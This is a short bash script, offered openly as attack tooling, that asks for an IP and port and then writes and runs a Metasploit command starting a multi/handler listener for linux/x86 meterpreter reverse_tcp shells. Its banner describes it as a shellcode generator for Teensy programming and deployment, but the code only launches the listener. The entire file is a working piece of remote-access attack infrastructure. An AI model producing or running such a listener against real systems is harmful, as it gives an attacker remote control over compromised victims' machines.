#!/bin/bash
clear
echo "***************************************************************"
echo "       Automatic  shellcode generator - FOR METASPLOIT         "
echo "       For Automatic Teensy programming and deployment         "
echo "***************************************************************"
echo -e "What IP are we gonna listen to ?  \c"
read host
echo -e "What Port Number are we gonna listen to? : \c"
read port
echo "Starting the meterpreter listener.."
echo -n './msfconsole -x "use exploit/multi/handler;  set PAYLOAD linux/x86/meterpreter/reverse_tcp ; set LHOST ' > run.listener.sh 
echo -n $host >> run.listener.sh 
echo -n '; set LPORT ' >> run.listener.sh 
echo -n $port >> run.listener.sh 
echo -n '; run"' >> run.listener.sh  
chmod +x run.listener.sh 
./run.listener.sh 

